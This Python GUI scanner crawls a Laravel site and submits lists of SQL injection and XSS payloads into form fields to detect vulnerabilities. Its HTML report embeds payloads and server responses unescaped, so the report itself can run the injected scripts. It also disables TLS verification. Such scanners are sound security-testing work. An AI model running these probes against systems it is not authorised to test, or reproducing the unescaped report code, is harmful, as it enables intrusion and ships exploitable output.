#!/usr/bin/env python3
"""
Laravel Security Tester
SQL Injection + XSS Scanner (Local & Remote)
GUI with real-time logging, login, export, and local dev support
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import ttkbootstrap as ttkb
from ttkbootstrap.constants import *
import requests
from bs4 import BeautifulSoup
import urllib.parse
import time
import threading
import json
import hashlib
from datetime import datetime
import urllib3

# Suppress SSL warnings for local HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================================
# CONFIGURATION
# ================================
TIMEOUT = 15
DELAY_BETWEEN_REQUESTS = 0.2
TIME_THRESHOLD = 4
XSS_MARKER = "XSS_MARKER_FOUND_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

# SQLi Payloads
ERROR_PAYLOADS = [
    "'", "';--", "' OR '1'='1", "' OR '1'='1'--", "') OR ('1'='1",
    "' UNION SELECT NULL--", "' AND SUBSTRING(@@version,1,1)=5--"
]

BOOLEAN_PAYLOADS = [
    "' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--"
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"'><script>alert(1)</script>",
    "javascript:alert(1)",
    "';alert(1);//",
    "jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=alert(1)//'>",
    f"<img src='x' onerror='window.XSS_MARKER=1; document.body.innerHTML+=\"{XSS_MARKER}\"'>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]


# ================================
# MAIN APPLICATION CLASS
# ================================
class LaravelSecurityTester:
    def __init__(self, root):
        self.root = root
        self.root.title("Laravel Security Tester")  # EXACT NAME
        self.root.geometry("1150x780")
        self.root.minsize(1000, 600)
        self.style = ttkb.Style("darkly")

        # Session (local-friendly)
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml"
        })
        self.session.verify = False  # Allow self-signed HTTPS

        # State
        self.forms = []
        self.vulnerable_sqli = []
        self.vulnerable_xss = []
        self.visited = set()
        self.stop_event = threading.Event()
        self.base_url = ""

        self.build_ui()

    def build_ui(self):
        # === Header ===
        header = ttk.Frame(self.root, padding=15)
        header.pack(fill=X)

        title = ttk.Label(
            header,
            text="Laravel Security Tester",
            font=("Helvetica", 22, "bold"),
            foreground="#00d4aa"
        )
        title.pack(side=LEFT)

        theme_btn = ttk.Button(header, text="Theme", bootstyle=OUTLINE, command=self.toggle_theme)
        theme_btn.pack(side=RIGHT)

        # === Config Frame ===
        config_frame = ttk.LabelFrame(self.root, text="Scan Configuration", padding=15)
        config_frame.pack(fill=X, padx=20, pady=10)

        # Target URL
        ttk.Label(config_frame, text="Target URL:").grid(row=0, column=0, sticky=W, pady=5)
        self.url_var = tk.StringVar(value="http://localhost:8000")
        url_entry = ttk.Entry(config_frame, textvariable=self.url_var, width=55)
        url_entry.grid(row=0, column=1, columnspan=2, padx=5, pady=5, sticky=W)

        # Host Header
        ttk.Label(config_frame, text="Host Header:").grid(row=1, column=0, sticky=W, pady=5)
        self.host_var = tk.StringVar(value="")
        host_entry = ttk.Entry(config_frame, textvariable=self.host_var, width=30)
        host_entry.grid(row=1, column=1, padx=5, pady=5, sticky=W)
        ttk.Label(config_frame, text="(e.g., myapp.test)").grid(row=1, column=2, sticky=W, padx=5)

        # Login
        ttk.Label(config_frame, text="Login Email:").grid(row=2, column=0, sticky=W, pady=5)
        self.login_user = tk.StringVar()
        ttk.Entry(config_frame, textvariable=self.login_user, width=25).grid(row=2, column=1, padx=5, pady=5, sticky=W)

        ttk.Label(config_frame, text="Password:").grid(row=2, column=2, sticky=W, padx=(20,0))
        self.login_pass = tk.StringVar()
        ttk.Entry(config_frame, textvariable=self.login_pass, show="*", width=25).grid(row=2, column=3, padx=5, pady=5, sticky=W)

        # Crawl Depth
        ttk.Label(config_frame, text="Crawl Depth:").grid(row=3, column=0, sticky=W, pady=5)
        self.depth_var = tk.IntVar(value=3)
        depth_spin = ttk.Spinbox(config_frame, from_=1, to=10, textvariable=self.depth_var, width=10)
        depth_spin.grid(row=3, column=1, padx=5, pady=5, sticky=W)

        # Buttons
        btn_frame = ttk.Frame(config_frame)
        btn_frame.grid(row=4, column=0, columnspan=4, pady=15)

        self.start_btn = ttk.Button(btn_frame, text="Start Scan", bootstyle=SUCCESS, command=self.start_scan)
        self.start_btn.pack(side=LEFT, padx=5)

        self.stop_btn = ttk.Button(btn_frame, text="Stop", bootstyle=DANGER, command=self.stop_scan, state=DISABLED)
        self.stop_btn.pack(side=LEFT, padx=5)

        self.export_btn = ttk.Button(btn_frame, text="Export Report", bootstyle=INFO, command=self.export_report, state=DISABLED)
        self.export_btn.pack(side=LEFT, padx=5)

        # === Progress Bar ===
        self.progress = ttk.Progressbar(self.root, mode='indeterminate', bootstyle=INFO)
        self.progress.pack(fill=X, padx=20, pady=5)

        # === Log Area ===
        log_frame = ttk.LabelFrame(self.root, text="Real-time Scan Log", padding=10)
        log_frame.pack(fill=BOTH, expand=True, padx=20, pady=10)

        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=22,
            state='disabled',
            font=("Consolas", 10),
            wrap=tk.WORD,
            background="#1e1e1e",
            foreground="#d4d4d4"
        )
        self.log_text.pack(fill=BOTH, expand=True)

        # Color tags
        self.log_text.tag_config("info", foreground="#bbbbbb")
        self.log_text.tag_config("success", foreground="#28a745")
        self.log_text.tag_config("warn", foreground="#ffc107")
        self.log_text.tag_config("error", foreground="#dc3545")

        # === Status Bar ===
        self.status_var = tk.StringVar(value="Ready to scan")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=SUNKEN, anchor=W, padding=5)
        status_bar.pack(fill=X, side=BOTTOM)

    def toggle_theme(self):
        current = self.style.theme_use()
        new = "flatly" if current == "darkly" else "darkly"
        self.style.theme_use(new)
        self.log(f"Theme switched to: {new}", "INFO")

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        tag = level.lower()
        self.log_text.configure(state='normal')
        self.log_text.insert(END, f"[{timestamp}] [{level}] {message}\n", tag)
        self.log_text.see(END)
        self.log_text.configure(state='disabled')
        self.root.update_idletasks()

    # ================================
    # SCAN CONTROL
    # ================================
    def start_scan(self):
        url = self.url_var.get().strip()
        if not url.startswith(("http://", "https://")):
            messagebox.showerror("Invalid URL", "Please enter a valid URL (http:// or https://)")
            return

        self.stop_event.clear()
        self.start_btn.config(state=DISABLED)
        self.stop_btn.config(state=NORMAL)
        self.export_btn.config(state=DISABLED)
        self.progress.start(10)
        self.log_text.delete(1.0, END)

        thread = threading.Thread(target=self.run_scan, args=(url,), daemon=True)
        thread.start()

    def stop_scan(self):
        self.stop_event.set()
        self.log("Scan stopped by user.", "WARN")

    def finish_scan(self):
        self.progress.stop()
        self.start_btn.config(state=NORMAL)
        self.stop_btn.config(state=DISABLED)
        self.export_btn.config(state=NORMAL)
        total = len(self.vulnerable_sqli) + len(self.vulnerable_xss)
        self.status_var.set(f"Completed | SQLi: {len(self.vulnerable_sqli)} | XSS: {len(self.vulnerable_xss)}")
        self.log(f"Scan finished. {total} vulnerabilities found.", "SUCCESS")

    # ================================
    # CORE SCAN ENGINE
    # ================================
    def run_scan(self, base_url):
        try:
            self.base_url = base_url.rstrip('/')
            self.forms.clear()
            self.vulnerable_sqli.clear()
            self.vulnerable_xss.clear()
            self.visited.clear()

            # Apply Host header
            host = self.host_var.get().strip()
            if host:
                self.session.headers["Host"] = host
                self.log(f"Using Host header: {host}", "INFO")

            self.log(f"Starting scan on {self.base_url}", "INFO")

            # Login
            if self.login_user.get().strip() and self.login_pass.get().strip():
                self.login()

            # Crawl
            self.crawl(self.base_url, depth=0, max_depth=self.depth_var.get())
            self.log(f"Crawl complete. Found {len(self.forms)} forms.", "INFO")

            # Test forms
            for i, form in enumerate(self.forms):
                if self.stop_event.is_set():
                    break
                self.status_var.set(f"Testing form {i+1}/{len(self.forms)}")
                self.test_form(form)
                time.sleep(0.1)

            self.finish_scan()
        except Exception as e:
            self.log(f"Scan failed: {e}", "ERROR")
            self.finish_scan()

    def login(self):
        login_url = urllib.parse.urljoin(self.base_url, '/login')
        try:
            resp = self.session.get(login_url, timeout=TIMEOUT)
            soup = BeautifulSoup(resp.text, 'html.parser')
            csrf = soup.find("meta", {"name": "csrf-token"})
            if csrf:
                self.session.headers["X-CSRF-TOKEN"] = csrf["content"]

            data = {
                "email": self.login_user.get(),
                "password": self.login_pass.get(),
            }
            resp = self.session.post(login_url, data=data, timeout=TIMEOUT)
            if resp.status_code == 200 and ("dashboard" in resp.text.lower() or "logout" in resp.text.lower()):
                self.log("Login successful", "SUCCESS")
            else:
                self.log("Login failed (check credentials)", "WARN")
        except Exception as e:
            self.log(f"Login error: {e}", "ERROR")

    def crawl(self, url, depth=0, max_depth=3):
        if self.stop_event.is_set() or depth > max_depth or url in self.visited:
            return
        self.visited.add(url)

        try:
            resp = self.session.get(url, timeout=TIMEOUT)
            if resp.status_code != 200:
                return
            time.sleep(DELAY_BETWEEN_REQUESTS)
        except Exception as e:
            self.log(f"Crawl failed: {url} → {e}", "WARN")
            return

        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf = soup.find("meta", {"name": "csrf-token"})
        if csrf:
            self.session.headers["X-CSRF-TOKEN"] = csrf["content"]

        # Extract forms
        for form_tag in soup.find_all('form'):
            form = self.extract_form(form_tag, url)
            if form and form not in self.forms:
                self.forms.append(form)
                self.log(f"Found form: {form['method'].upper()} {form['url']}", "INFO")

        # Follow links
        for a in soup.find_all('a', href=True):
            href = a['href']
            next_url = urllib.parse.urljoin(self.base_url, href)
            if self.is_internal(next_url) and next_url not in self.visited:
                self.crawl(next_url, depth + 1, max_depth)

    def is_internal(self, url):
        parsed = urllib.parse.urlparse(url)
        base_netloc = urllib.parse.urlparse(self.base_url).netloc
        return parsed.netloc == base_netloc or parsed.netloc in ["localhost", "127.0.0.1", "::1"]

    def extract_form(self, form_tag, page_url):
        action = form_tag.get('action', '')
        method = form_tag.get('method', 'get').lower()
        action_url = urllib.parse.urljoin(page_url, action)
        inputs = {}
        for inp in form_tag.find_all(['input', 'textarea', 'select']):
            name = inp.get('name')
            if name:
                inputs[name] = inp.get('value', '')
        if '_method' in inputs:
            method = inputs['_method'].lower()
        return {'url': action_url, 'method': method, 'inputs': inputs, 'page': page_url}

    def submit_form(self, url, method, inputs):
        try:
            start = time.time()
            headers = {}
            if self.host_var.get().strip():
                headers["Host"] = self.host_var.get()

            if method == 'post':
                resp = self.session.post(url, data=inputs, timeout=TIMEOUT, headers=headers, allow_redirects=True)
            else:
                resp = self.session.get(url, params=inputs, timeout=TIMEOUT, headers=headers, allow_redirects=True)
            return {
                'status': resp.status_code,
                'content': resp.text,
                'time': time.time() - start,
                'url': resp.url
            }
        except Exception as e:
            self.log(f"Request failed: {e}", "WARN")
            return None

    def test_form(self, form):
        url = form['url']
        method = form['method'].upper()
        inputs = form['inputs'].copy()

        baseline = self.submit_form(url, method, inputs)
        if not baseline:
            return

        baseline_len = len(baseline['content'])
        baseline_time = baseline['time']

        for field in list(inputs.keys()):
            if field in ['_token', '_method']:
                continue

            # === SQLi Testing ===
            for payload in ERROR_PAYLOADS + BOOLEAN_PAYLOADS:
                if self.stop_event.is_set():
                    return
                test_inputs = inputs.copy()
                test_inputs[field] = payload
                result = self.submit_form(url, method, test_inputs)
                if not result:
                    continue

                content = result['content'].lower()
                res_time = result['time']

                if any(err in content for err in ['sql', 'syntax', 'mysql', 'pgsql', 'odbc']):
                    self.vulnerable_sqli.append({
                        'type': 'Error-Based SQLi',
                        'field': field,
                        'payload': payload,
                        'evidence': result['content'][:500],
                        'url': result['url']
                    })
                    self.log(f"SQLi FOUND: {field} → {payload}", "SUCCESS")

                if 'SLEEP' in payload and res_time > TIME_THRESHOLD:
                    self.vulnerable_sqli.append({
                        'type': 'Time-Based SQLi',
                        'field': field,
                        'payload': payload,
                        'delay': f"{res_time:.2f}s",
                        'url': result['url']
                    })
                    self.log(f"Time-Based SQLi: {field} → {payload} ({res_time:.2f}s)", "SUCCESS")

            # === XSS Testing ===
            for payload in XSS_PAYLOADS:
                if self.stop_event.is_set():
                    return
                test_inputs = inputs.copy()
                test_inputs[field] = payload
                result = self.submit_form(url, method, test_inputs)
                if not result:
                    continue

                content = result['content']
                if payload in content or "alert(1)" in content or XSS_MARKER in content:
                    vuln_type = "DOM-Based XSS" if XSS_MARKER in content else "Reflected XSS"
                    self.vulnerable_xss.append({
                        'type': vuln_type,
                        'field': field,
                        'payload': payload,
                        'url': result['url']
                    })
                    short = payload.replace('\n', ' ')[:50]
                    self.log(f"XSS FOUND: {field} → {short}...", "SUCCESS")

    # ================================
    # REPORT EXPORT
    # ================================
    def export_report(self):
        file = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON Report", "*.json"), ("HTML Report", "*.html"), ("All Files", "*.*")]
        )
        if not file:
            return

        report = {
            "app_name": "Laravel Security Tester",
            "scan_time": datetime.now().isoformat(),
            "target": self.base_url,
            "host_header": self.host_var.get(),
            "forms_tested": len(self.forms),
            "sqli_vulnerabilities": self.vulnerable_sqli,
            "xss_vulnerabilities": self.vulnerable_xss
        }

        if file.endswith(".json"):
            with open(file, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            self.log(f"JSON report saved: {file}", "INFO")

        elif file.endswith(".html"):
            html = self.generate_html_report(report)
            with open(file, "w", encoding="utf-8") as f:
                f.write(html)
            self.log(f"HTML report saved: {file}", "INFO")

    def generate_html_report(self, report):
        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Laravel Security Tester - Report</title>
            <style>
                body {{ font-family: 'Segoe UI', sans-serif; margin: 40px; background: #f8f9fa; }}
                .container {{ max-width: 1000px; margin: auto; }}
                h1 {{ color: #00d4aa; }}
                .summary {{ background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .vuln {{ border-left: 5px solid; margin: 15px 0; padding: 15px; border-radius: 5px; }}
                .sqli {{ border-color: #dc3545; background: #fff5f5; }}
                .xss {{ border-color: #ffc107; background: #fffbe6; }}
                pre {{ background: #f4f4f4; padding: 10px; border-radius: 5px; overflow-x: auto; }}
                code {{ background: #eee; padding: 2px 6px; border-radius: 3px; }}
                a {{ color: #007bff; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
        <div class="container">
            <h1>Laravel Security Tester</h1>
            <div class="summary">
                <p><strong>Target:</strong> {report['target']}</p>
                <p><strong>Scan Time:</strong> {report['scan_time']}</p>
                <p><strong>Forms Tested:</strong> {report['forms_tested']}</p>
            </div>

            <h2>SQL Injection ({len(report['sqli_vulnerabilities'])})</h2>
            {''.join([
                f'''
                <div class="vuln sqli">
                    <strong>{v['type']}</strong><br>
                    Field: <code>{v['field']}</code><br>
                    Payload: <code>{v['payload']}</code><br>
                    <a href="{v['url']}" target="_blank">Open Vulnerable URL</a>
                    {f'<pre>{v.get("evidence", "")}</pre>' if 'evidence' in v else ''}
                </div>
                ''' for v in report['sqli_vulnerabilities']
            ]) or "<p>No SQL injection vulnerabilities found.</p>"}

            <h2>XSS Vulnerabilities ({len(report['xss_vulnerabilities'])})</h2>
            {''.join([
                f'''
                <div class="vuln xss">
                    <strong>{v['type']}</strong><br>
                    Field: <code>{v['field']}</code><br>
                    Payload: <code>{v['payload']}</code><br>
                    <a href="{v['url']}" target="_blank">Open Vulnerable URL</a>
                </div>
                ''' for v in report['xss_vulnerabilities']
            ]) or "<p>No XSS vulnerabilities found.</p>"}
        </div>
        </body>
        </html>
        """


# ================================
# LAUNCH APPLICATION
# ================================
if __name__ == "__main__":
    root = ttkb.Window(themename="darkly")
    app = LaravelSecurityTester(root)
    root.mainloop()